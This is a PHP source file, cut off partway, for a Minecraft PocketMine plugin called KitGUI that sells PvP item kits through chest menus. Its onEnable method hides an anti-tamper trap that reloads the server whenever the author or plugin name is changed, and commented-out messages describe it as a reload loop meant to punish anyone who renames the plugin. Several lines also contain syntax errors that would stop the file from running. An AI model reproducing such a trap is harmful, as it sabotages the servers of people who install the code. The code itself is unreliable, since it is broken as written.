<?php

// Instead of giving the player the armor in their inventory, use getArmorInventory and set(ArmorPeice) to put the armor on the player.
// This may be an issue if the player wants extra armor in their vault.
// Try to add a function where people can see what items are in the kit.
// Added /seekit for 2 more kits
// Added /rmkitgui to remove KitGUI if improper credits are being given
// Added /kitinfo

// Updated: 11/17/2020
// Updating command /seekit | This will allow for players to see the content inside of a Kit before buying it.

namespace KITGUI;

use pocketmine\Server;
use pocketmine\Player;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\CommandExecutor;
use pocketmine\event\Listener;
use pocketmine\plugin\PluginBase;
use pocketmine\utils\Config;
use pocketmine\utils\Terminal;
use pocketmine\utils\TextFormat;
use pocketmine\command\FormattedCommandAlias;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\item\enchantment\Enchantment;
use pocketmine\item\enchantment\EnchantmentInstance;
use pocketmine\item\Item;
use pocketmine\item\Armor;
use pocketmine\item\Tool;
use pocketmine\math\Vector3;
use pocketmine\level\sound\AnvilUseSound;
use muqsit\invmenu\InvMenu;
use muqsit\invmenu\InvMenuHandler;

class Main extends PluginBase implements Listener
{

    public $cooldownList = [];

    public function onEnable()
    {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        $this->eco = $this->getServer()->getPluginManager()->getPlugin("EconomyAPI");
        $this->getLogger()->info(TextFormat::GREEN . "KitGUI by ethaniccc has been enabled!");
        $this->getLogger()->info(TextFormat::GREEN . "If you like this plugin, share it ( with credits :D )");
        $this->getLogger()->info(TextFormat::GREEN . "Website: §6https://www.github.com/ethaniccc");

        if ($this->getDescription()->getAuthors() [0] !== "ethaniccc" || $this->getDescription()->getName() !== "KitGUI") {
            /*$this->getLogger()->info(TextFormat::RED . "Seriously? You thought you could just steal my plugin like that?");
            $this->getLogger()->info(TextFormat::RED . "This is a KitGUI plugin made by ethaniccc, and not anybody else");
            $this->getLogger()->info(TextFormat::RED . "Ethaniccc will now put your server in a reload loop until proper credits are given.");
            $this->getLogger()->info(TextFormat::RED . "You are a horrible, terrible, and sad human being for trying to steal my work and make it your own.");*/
            $this->getServer()->reload();
        }
        if (!InvMenuHandler::isRegistered()) {
            InvMenuHandler::register($this);
        }
    }

    public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool
    {
        if ($sender instanceof Player) {
            switch ($command->getName()) {
                case "kits":
                    $this->onSend($sender);
                    break;
                case "seekit";
                    $this->onSend2($sender);
                    break;
                case "kitinfo";
                    $this->giveInfo($sender);
                    break;
                case "xyz";
                    $this->XYZ($sender);
                    break;
                case "rmkitgui";
                    $this->AntiSteal($sender);
                    break;
            }
        } else {
            $this->getLogger()->info(TextFormat::RED . "Please run this command as a player!");
        }
        return true;
    }

    public function onSend(Player $p)
    {
        $menu = new InvMenu(InvMenu::TYPE_CHEST);
        $menu->readonly();
        $menu->setListener([$this, "formenc"]);
        $menu->setName("Kits");
        $item = Item::get(267, 0, 1);
        $item->setLore([TextFormat::GOLD . "FREE: The most basic kit in KitPvP mode!"]);
        $item1 = Item::get(261, 0, 1);
        $item1->setLore([TextFormat::GOLD . "FREE: The archer kit is a kit for people who prefer good bows than good swords!"]);
        $item2 = Item::get(368, 0, 1);
        $item2->setLore([TextFormatLLGOLD . "$300: The Ninja way! Includes many things such as Shurikens!"]);
        $item3 = Item::get(276, 0, 1);
        $item3->setLore([TextFormat::GOLD . "$550: It's the PvP kit, but better..."]);
        $item4 = Item::get(373, 25, 1);
        $item4->setLore([TextFormat::GOLD . "$400: Become a Witch and use your spells againts others!"]);
        $item5 = Item::get(311, 0, 1);
        $item5->setLore([TextFormat::GOLD . "$600: It's all about the defense!"]);
        $item->setCustomName(TextFormat::YELLOW . "PvP");
        $item1->setCustomName(TextFormat::YELLOW . "Archer");
        $item2->setCustomName(TextFormat::GREEN . "Ninja");
        $item3->setCustomName(TextFormat::GREEN . "PvP+");
        $item4->setCustomName(TextFormat::DARK_GREEN . "Witch");
        $item5->setCustomName(TextFormat::DARK_GREEN . "Tank");
        $inv = $menu->getInventory();
        $inv->setItem(0, $item); // pvp free
        $inv->setItem(1, $item1); // archer free
        $inv->setItem(2, $item2); // Ninja 300
        $inv->setItem(4, $item3); // pvp+ 550
        $inv->setItem(3, $item4); // witch 400
        $inv->setItem(5, $item5); // tank 600
        $menu->send($p);
    }

    public function formenc(Player $p, Item $item)
    {
        if ($item->getId() == 267) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; // 30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 0;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    // the following is a test
                    // ironsword id is 267
                    // pvp sword
                    $i3 = Item::get(267, 0, 1);
                    $i3->setCustomName(TextFormat::GREEN . "PvP Sword");
                    $ie3 = Enchantment::getEnchantment(9);
                    $i3->addEnchantment(new EnchantmentInstance($ie3, 1));
                    $p->getInventory()->addItem($i3);
                    // pvp bow
                    $i2 = Item::get(261, 0, 1);
                    $i2->setCustomName(TextFormat::GREEN . "PvP Bow");
                    $ie2 = Enchantment::getEnchantment(19);
                    $i2->addEnchantment(new EnchantmentInstance($ie2, 1));
                    $p->getInventory()->addItem($i2);
                    $p->getInventory()->addItem(Item::get(322, 0, 16)->setCustomName(TextFormat::GOLD"Golden Apple"));
                    $p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP Helmet"));
                    $p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP Chestplate"));
                    $p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP Leggings"));
                    $p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP Boots"));
                    // end of test
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " . TextFormat::GOLD . "PvP " . TextFormat::GREEN . "kit!");
                } else {
                    $name = $p->getName();
                    $p->sendMessage(TextFormat::RED . "You somehow could not obtain a Free kit. This incident will be reported.");
                    $this->getLogger()->warn($name . " was not able to obtain the PvP kit. Check their balance using EconomyAPI.");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you can get the " .
                                    TextFormat::GOLD . "PvP " .
                                    TextFormat::RED . "kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        } elseif ($item->getId() == 261) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; // 30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 0;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    // start of test //stone sword id is 272
                    // archer sword
                    $i4 = Item::get(272, 0, 1);
                    $i4->setCustomName(TextFormat::GREEN . "Archer Knife");
                    $ie4 = Enchantment::getEnchantment(9);
                    $i4->addEnchantment(new EnchantmentInstance($ie4, 1));
                    $p->getInventory()->addItem($i4);
                    // archer bow
                    $i5 = Item::get(261, 0, 1);
                    $i5->setCustomName(TextFormat::GREEN . "Archer Bow");
                    $ie5 = Enchantment::getEnchantment(19);
                    $i5->addEnchantment(new EnchantmentInstance($ie5, 2));
                    $p->getInventory()->addItem($i5);
                    $p->getInventory()->addItem(Item::get(322, 0, 16)->setCustomName(TextFormat::GOLD . "Golden Apple"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GOLD . "Arrows"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GOLD . "Arrows"));
                    $p->getArmorInventory()->setHelmet(Item::get(302, 0, 1)->setCustomName(TextFormat::GREEN . "Archer Helmet"));
                    $p->getArmorInventory()->setChestplate(Item::get(311, 0, 1)->setCustomName(TextFormat::GREEN . "Archer Chestplate"));
                    $p->getArmorInventory()->setLeggings(Item::get(304, 0, 1)->setCustomName(TextFormat::GREEN . "Archer Leggings"));
                    $p->getArmorInventory()->setBoots(Item::get(305, 0, 1)->setCustomName(TextFormat::GOLD . "Archer Boots"));
                    // end of test
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " TextFormat::GOLD . "Archer "TextFormat::GREEN . "kit!");
                } else {
                    $p->sendMessage(TextFormat::RED . "You are somehow unable to obtain a Free kit. This incident will be reported to the console...");
                    $this->getLogger()->warn("A player using KitGUI was not able to obtain a free kit...");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you can get the " .
                                    TextFormat::GOLD . "Archer " .
                                    TextFormat::RED . "kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        } elseif ($item->getId() == 368) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; //30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 300;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    // start of test
                    // ninja katana
                    $i6 = Item::get(267, 0, 1);
                    $i6->setCustomName(TextFormat::GREEN . "Ninja Katana");
                    $ie6 = Enchantment::getEnchantment(9);
                    $i6->addEnchantment(new EnchantmentInstance($ie6, 1));
                    $p->getInventory()->addItem($i6);
                    $p->getInventory()->addItem(Item::get(373, 7, 1)->setCustomName(TextFormat::GOLD . "Camouflage"));
                    $p->getInventory()->addItem(Item::get(368, 0, 16)->setCustomName(TextFormat::GOLD . "Ninja Pearls"));
                    $p->getInventory()->addItem(Item::get(332, 0, 16)->setCustomName(TextFormat::GOLD . "Ninja Shurikens"));
                    $p->getInventory()->addItem(Item::get(332, 0, 16)->setCustomName(TextFormat::GOLD . "Ninja Shurikens"));
                    $p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName(TextFormat::GOLD . "Ninja Hood"));
                    $p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName(TextFormat::GOLD . "Ninja Shirt"));
                    $p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName(TextFormat::GOLD . "Ninja Pants"));
                    $p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName(TextFormat::GOLD . "Tank Shoes"));
                    // end of the test
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " .
                                    TextFormat::GOLD . "Ninja " .
                                    TextFormat::GREEN . "kit!");
                } else {
                    $p->sendMessage(TextFormat::RED . "You do not have enough funds to buy the " .
                                    TextFormat::GOLD . "Ninja" .
                                    TextFormat::RED . " kit!");
                    $this->getLogger()->info($p . " attempted to buy the Ninja kit with insufficent funds.");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you get the " .
                                    TextFormat::GOLD . "Ninja " .
                                    TextFormat::RED . "kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        } elseif ($item->getId() == 276) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; // 30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 550;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    //pvp+ sword
                    $i7 = Item::get(276, 0, 1);
                    $i7->setCustomName(TextFormat::BOLD . TextFormat::GREEN . "PvP+ Sword");
                    $ie7 = Enchantment::getEnchantment(9);
                    $i7->addEnchantment(new EnchantmentInstance($ie7, 1));
                    $p->getInventory()->addItem($i7);
                    //pvp+ bow
                    $i8 = Item::get(261, 0, 1);
                    $i8->setCustomName(TextFormat::BOLD . TextFormat::GREEN . "PvP+ Bow");
                    $ie8 = Enchantment::getEnchantment(19);
                    $i8->addEnchantment(new EnchantmentInstance($ie8, 2));
                    $p->getInventory()->addItem($i8);
                    $p->getInventory()->addItem(Item::get(322, 0, 24)->setCustomName(TextFormat::GOLD . "Golden Apple+"));
                    $p->getInventory()->addItem(Item::get(306, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP+ Helmet"));
                    $p->getInventory()->addItem(Item::get(311, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP+ Chestplate"));
                    $p->getInventory()->addItem(Item::get(312, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP+ Leggings"));
                    $p->getInventory()->addItem(Item::get(309, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "PvP+ Boots"));
                    //end of test
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " . TextFormat::GOLD . "PvP+ " . TextFormat::GREEN . "kit!");
                } else {
                    $p->sendMessage(TextFormat::RED . "You do not have the funds for the " .
                                    TextFormat::GOLD . "PvP+ " .
                                    TextFormat::RED . "kit!");
                    $this->getLogger($p . " attempted to buy the PvP+ kit with insufficent funds.");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you can get the " .
                                    TextFormat::GOLD . "PvP+ " .
                                    TextFormat::RED . "kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        } elseif ($item->getId() == 373) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; //30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 400;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    //start of test
                    $p->getInventory()->addItem(Item::get(267, 0, 1)->setCustomName(TextFormat::GREEN . "Witch Blade"));
                    $p->getInventory()->addItem(Item::get(466, 0, 1)->setCustomName(TextFormat::DARK_RED . "Emergency Healing Spell"));
                    $p->getInventory()->addItem(Item::get(438, 29, 1)->setCustomName(TextFormat::GOLD . "Healing Spell"));
                    $p->getInventory()->addItem(Item::get(438, 29, 1)->setCustomName(TextFormat::GOLD . "Healing Spell"));
                    $p->getInventory()->addItem(Item::get(438, 29, 1)->setCustomName(TextFormat::GOLD . "Healing Spell"));
                    $p->getInventory()->addItem(Item::get(438, 29, 1)->setCustomName(TextFormat::GOLD . "Healing Spell"));
                    $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName(TextFormat::GOLD . "Poison Spell"));
                    $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName(TextFormat::GOLD . "Poison Spell"));
                    $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName(TextFormat::GOLD . "Poison Spell"));
                    $p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "Witch Helmet"));
                    $p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "Witch Chestplate"));
                    $p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "Witch Leggings"));
                    $p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName(TextFormat::GREEN . TextFormat::BOLD . "Witch Boots"));
                    //end of the test
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " .
                                    TextFormat::GOLD . "Witch " .
                                    TextFormat::GREEN . "kit!");
                } else {
                    $p->sendMessage(TextFormat::RED . "You do not have enough money to buy the " .
                                    TextFormat::GOLD . "Witch " .
                                    TextFormat::RED . "kit!");
                    $this->getLogger()->info($p . " tried to buy the Witch kit with insufficent funds.");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you can get the " .
                                    TextFormat::GOLD . "Witch " .
                                    TextFormat::RED . "kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        } elseif ($item->getId() == 311) {
            if (!isset($this->cooldownList[$p->getName() ])) {
                $this->cooldownList[$p->getName() ] = time() + 30; //30 second cooldown for opening kit menu.
                $mymoney = $this->eco->myMoney($p);
                $pay = 600;
                if ($mymoney >= $pay) {
                    $this->eco->reduceMoney($p, $pay);
                    // start of the test
                    // $i = Item::get(267, 0, 1);
                    // $i->setCustomName("Test Blade");
                    // $e = Enchantment::getEnchantment(12);
                    // $i->addEnchantment(new EnchantmentInstance($e, 100));
                    // $p->getInventory()->addItem($i);
                    // end of the test
                    // NOTE: The enchantments can be as broken as the writer may want them to be.
                    // This is the sword for the Tank kit. The variable for the sword is $i and the enchantment $ie
                    $i = Item::get(268, 0, 1);
                    $i->setCustomName(TextFormat::GREEN . "Stick");
                    $ie = Enchantment::getEnchantment(17);
                    $i->addEnchantment(new EnchantmentInstance($ie, 1000));
                    $p->getInventory()->addItem($i);
                    $p->getInventory()->addItem(Item::get(322, 0, 32)->setCustomName(TextFormat::GOLD . "Golden Apple"));
                    // This is the bow for the Tank kit.
                    $i1 = Item::get(261, 0, 1);
                    $i1->setCustomName(TextFormat::GREEN . "Gun");
                    $ie1 = Enchantment::getEnchantment(19);
                    $i1->addEnchantment(new EnchantmentInstance($ie1, 2));
                    $p->getInventory()->addItem($i1);
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GREEN . "Bullet"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GREEN . "Bullet"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GREEN . "Bullet"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GREEN . "Bullet"));
                    $p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName(TextFormat::GREEN . "Bullet"));
                    $p->getArmorInventory()->setHelmet(Item::get(310, 0, 1)->setCustomName(TextFormat::GOLD . "Tank Helmet"));
                    $p->getArmorInventory()->setChestplate(Item::get(311, 0, 1)->setCustomName(TextFormat::GOLD . "Tank Chestplate"));
                    $p->getArmorInventory()->setLeggings(Item::get(312, 0, 1)->setCustomName(TextFormat::GOLD . "Tank Leggings"));
                    $p->getArmorInventory()->setBoots(Item::get(313, 0, 1)->setCustomName(TextFormat::GOLD . "Tank Boots"));
                    $p->getLevel()->addSound(new AnvilUseSound($p));
                    $p->sendMessage(TextFormat::GREEN . "You have successfuly obtained the " .
                                    TextFormat::GOLD . "Tank " .
                                    TextFormat::GREEN . "kit!");
                } else {
                    $p->sendMessage(TextFormat::RED . "You do not have enough money to buy the " .
                                    TextFormat::GOLD . "Tank " .
                                    TextFormat::RED . "kit!");
                    $this->getLogger()->info($p . " attempted to buy the Tank kit with insufficent funds.");
                }
            } else {
                if (time() < $this->cooldownList[$p->getName() ]) {
                    $remaining = $this->cooldownList[$p->getName() ] - time();
                    $p->sendMessage(TextFormat::RED . "ERROR: There is still " .
                                    TextFormat::GOLD . $remaining .
                                    TextFormat::RED . " seconds remaining until you can get this kit again!");
                } else {
                    unset($this->cooldownList[$p->getName() ]);
                }
            }
            return true;
        }
    }

    // start here onSend2 for /viewkit
    public function onSend2(Player $p)
    {
        $menu2 = new InvMenu(InvMenu::TYPE_CHEST);
        $menu2->readonly();
        $menu2->setListener([$this, "viewkit"]);
        $menu2->setName("View Kits");
        $item10 = Item::get(267, 0, 1);
        $item10->setLore([TextFormat::GOLD . "PvP Kit"]);
        $item11 = Item::get(261, 0, 1);
        $item11->setLore([TextFormat::GOLD . "Archer Kit"]);
        $item12 = Item::get(368, 0, 1);
        $item12->setLore([TextFormat::GOLD . "Ninja Kit"]);
        $item13 = Item::get(276, 0, 1);
        $item13->setLore([TextFormat::GOLD . "PvP+ Kit"]);
        $item14 = Item::get(373, 25, 1);
        $item14->setLore([TextFormat::GOLD . "Witch Kit"]);
        $item15 = Item::get(311, 0, 1);
        $item15->setLore([TextFormat::GOLD . "Tank Kit"]);
        $item10->setCustomName(TextFormat::YELLOW . "PvP");
        $item11->setCustomName(TextFormat::YELLOW . "Archer");
        $item12->setCustomName(TextFormat::GREEN . "Ninja");
        $item13->setCustomName(TextFormat::GREEN . "PvP+");
        $item14->setCustomName(TextFormat::DARK_GREEN . "Witch");
        $item15->setCustomName(TextFormat::DARK_GREEN . "Tank");
        $inv2 = $menu2->getInventory();
        $inv2->setItem(0, $item10);
        $inv2->setItem(1, $item11);
        $inv2->setItem(2, $item12);
        $inv2->setItem(4, $item13);
        $inv2->setItem(3, $item14);
        $inv2->setItem(5, $item15);
        $menu2->send($p);
    }

    public function viewkit(Player $p, Item $item)
    {
        if ($item->getId() == 267) {
            $menu3 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu3->readonly();
            $menu3->setListener([$this, "pvpkit"]);
            $menu3->setName("Kit: PvP Price: Free");
            $item20 = Item::get(267, 0, 1);
            $item20->setLore([TextFormat::GOLD . "Weapon for the PvP kit"]);
            $item21 = Item::get(261, 0, 1);
            $item21->setLore([TextFormat::GOLD . "Another weapon for the PvP kit"]);
            $item22 = Item::get(322, 0, 16);
            $item22->setLore([TextFormat::GOLD . "Healing Apples in the PvP kit!"]);
            $item23 = Item::get(306, 0, 1);
            $item23->setLore([TextFormat::GOLD . "Helmet Equipped In The PvP kit!"]);
            $item24 = Item::get(307, 0, 1);
            $item24->setLore([TextFormat::GOLD . "Chestplate Equipped In The PvP kit!"]);
            $item25 = Item::get(308, 0, 1);
            $item25->setLore([TextFormat::GOLD . "Leggings Equipped In The PvP kit!"]);
            $item26 = Item::get(309, 0, 1);
            $item26->setLore([TextFormat::GOLD . "Boots Equipped In The PvP kit!"]);
            $item27 = Item::get(35, 14, 1);
            $item27->setLore([TextFormat::GOLD . "Main Menu for Viewing Kits."]);
            $item28 = Item::get(262, 0, 64);
            $item28->setLore([TextFormat::GOLD . "The arrows included in the PvP Kit."]);
            $item29 = Item::get(262, 0, 64);
            $item29->setLore([TextFormat::GOLD . "The arrows included in the PvP Kit."]);
            $inv3 = $menu3->getInventory();
            $inv3->setItem(0, $item20);
            $inv3->setItem(1, $item21);
            $inv3->setItem(2, $item22);
            $inv3->setItem(3, $item23);
            $inv3->setItem(4, $item24);
            $inv3->setItem(5, $item25);
            $inv3->setItem(6, $item26);
            $inv3->setItem(26, $item27);
            $inv3->setItem(18, $item28);
            $inv3->setItem(19, $item29);
            $menu3->send($p);
        } elseif ($item->getId() == 261) {
            $menu4 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu4->readonly();
            $menu4->setListener([$this, "pvpkit"]);
            $menu4->setName("Kit: PvP Price: Free");
            $item30 = Item::get(272, 0, 1);
            $item30->setLore([TextFormat::GOLD . "Weapon for the Archer kit | Enchantments: Sharpness I"]);
            $item31 = Item::get(261, 0, 1);
            $item31->setLore([TextFormat::GOLD . "Another weapon for the Archer kit | Enchantments: Power II"]);
            $item32 = Item::get(322, 0, 16);
            $item32->setLore([TextFormat::GOLD . "Healing Apples in the Archer kit!"]);
            $item33 = Item::get(302, 0, 1);
            $item33->setLore([TextFormat::GOLD . "Helmet Equipped In The Archer kit!"]);
            $item34 = Item::get(311, 0, 1);
            $item34->setLore([TextFormat::GOLD . "Chestplate Equipped In The Archer kit!"]);
            $item35 = Item::get(304, 0, 1);
            $item35->setLore([TextFormat::GOLD . "Leggings Equipped In The Archer kit!"]);
            $item36 = Item::get(305, 0, 1);
            $item36->setLore([TextFormat::GOLD . "Boots Equipped In The Archer kit!"]);
            $item37 = Item::get(35, 14, 1);
            $item37->setLore([TextFormat::GOLD . "Main Menu for viewing kits."]);
            $item38 = Item::get(262, 0, 64);
            $item38->setLore([TextFormat::GOLD . "The arrows included in the Archer Kit."]);
            $item39 = Item::get(262, 0, 64);
            $item39->setLore([TextFormat::GOLD . "The arrows included in the Archer Kit."]);
            $inv4 = $menu4->getInventory();
            $inv4->setItem(0, $item30);
            $inv4->setItem(1, $item31);
            $inv4->setItem(2, $item32);
            $inv4->setItem(3, $item33);
            $inv4->setItem(4, $item34);
            $inv4->setItem(5, $item35);
            $inv4->setItem(6, $item36);
            $inv4->setItem(26, $item37);
            $inv4->setItem(18, $item38);
            $inv4->setItem(19, $item39);
            $menu4->send($p);
        } elseif ($item->getId() == 368) {
            $menu5 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu5->readonly();
            $menu5->setListener([$this, "pvpkit"]);
            $menu5->setName("Kit: PvP Price: Free");
            $item40 = Item::get(267, 0, 1);
            $item40->setLore([TextFormat::GOLD . "Weapon for the Ninja Kit"]);
            $item41 = Item::get(373, 7, 1);
            $item41->setLore([TextFormat::GOLD . "Invisibility Potion included in the Ninja kit"]);
            $item42 = Item::get(322, 0, 16);
            $item42->setLore([TextFormat::GOLD . "Healing Apples in the Ninja kit!"]);
            $item43 = Item::get(368, 0, 12);
            $item43->setLore([TextFormat::GOLD . "Enderpearls included in the Ninja kit!"]);
            $item44 = Item::get(332, 0, 32);
            $item44->setLore([TextFormat::GOLD . "Snowballs included in the Ninja kit!"]);
            $item45 = Item::get(306, 0, 1);
            $item45->setLore([TextFormat::GOLD . "Helmet equipped in the Ninja kit"]);
            $item46 = Item::get(307, 0, 1);
            $item46->setLore([TextFormat::GOLD . "Chestplate equipped in the Ninja kit"]);
            $item47 = Item::get(308, 0, 1);
            $item47->setLore([TextFormat::GOLD . "Leggings equipped in the Ninja kit"]);
            $item48 = Item::get(309, 0, 1);
            $item48->setLore([TextFormat::GOLD . "Boots equipped in the Ninja kit"]);
            $item49 = Item::get(35, 14, 1);
            $item49->setLore([TextFormat::GOLD . "Main menu for viewing kits."]);
            $inv5 = $menu5->getInventory();
            $inv5->setItem(0, $item40);
            $inv5->setItem(1, $item41);
            $inv5->setItem(2, $item42);
            $inv5->setItem(3, $item43);
            $inv5->setItem(4, $item44);
            $inv5->setItem(5, $item45);
            $inv5->setItem(6, $item46);
            $inv5->setItem(7, $item47);
            $inv5->setItem(8, $item48);
            $inv5->setItem(26, $item49);
            $menu5->send($p);
        } elseif ($item->getId() == 276) {
            $menu6 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu6->readonly();
            $menu6->setListener([$this, "pvpkit"]);
            $menu6->setName("Kit: PvP Price: Free");
            $item50 = Item::get(276, 0, 1);
            $item50->setLore([TextFormat::GOLD . "Weapon for the PvP+ kit | Enchantments: Sharpness I"]);
            $item51 = Item::get(261, 0, 1);
            $item51->setLore([TextFormat::GOLD . "Another weapon for the PvP+ kit | Enchantments: Power I"]);
            $item52 = Item::get(322, 0, 24);
            $item52->setLore([TextFormat::GOLD . "Healing Apples in the PvP+ kit!"]);
            $item53 = Item::get(306, 0, 1);
            $item53->setLore([TextFormat::GOLD . "Helmet Equipped In The PvP+ kit!"]);
            $item54 = Item::get(311, 0, 1);
            $item54->setLore([TextFormat::GOLD . "Chestplate Equipped In The PvP+ kit!"]);
            $item55 = Item::get(312, 0, 1);
            $item55->setLore([TextFormat::GOLD . "Leggings Equipped In The PvP+ kit!"]);
            $item56 = Item::get(309, 0, 1);
            $item56->setLore([TextFormat::GOLD . "Boots Equipped In The PvP+ kit!"]);
            $item57 = Item::get(35, 14, 1);
            $item57->setLore([TextFormat::GOLD . "Main Menu for Viewing Kits."]);
            $item58 = Item::get(262, 0, 64);
            $item58->setLore([TextFormat::GOLD . "The arrows included in the PvP+ Kit."]);
            $item59 = Item::get(262, 0, 64);
            $item59->setLore([TextFormat::GOLD . "The arrows included in the PvP+ Kit."]);
            $inv6 = $menu6->getInventory();
            $inv6->setItem(0, $item50);
            $inv6->setItem(1, $item51);
            $inv6->setItem(2, $item52);
            $inv6->setItem(3, $item53);
            $inv6->setItem(4, $item54);
            $inv6->setItem(5, $item55);
            $inv6->setItem(6, $item56);
            $inv6->setItem(26, $item57);
            $inv6->setItem(18, $item58);
            $inv6->setItem(19, $item59);
            $menu6->send($p);
        } elseif ($item->getId() == 373) {
            $menu7 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu7->readonly();
            $menu7->setListener([$this, "pvpkit"]);
            $menu7->setName("Kit: Witch");
            $item60 = Item::get(267, 0, 1);
            $item60->setLore([TextFormat::GOLD . "Weapon for the Witch kit | Enchantments: Sharpness I"]);
            $item61 = Item::get(466, 0, 1);
            $item61->setLore([TextFormat::GOLD . "Enchanted Golden Apple for emergencies"]);
            $item62 = Item::get(438, 29, 1);
            $item62->setLore([TextFormat::GOLD . "Healing Potion"]);
            $item63 = Item::get(438, 29, 1);
            $item63->setLore([TextFormat::GOLD . "Healing Potion"]);
            $item64 = Item::get(438, 29, 1);
            $item64->setLore([TextFormat::GOLD . "Healing Potion"]);
            $item65 = Item::get(438, 29, 1);
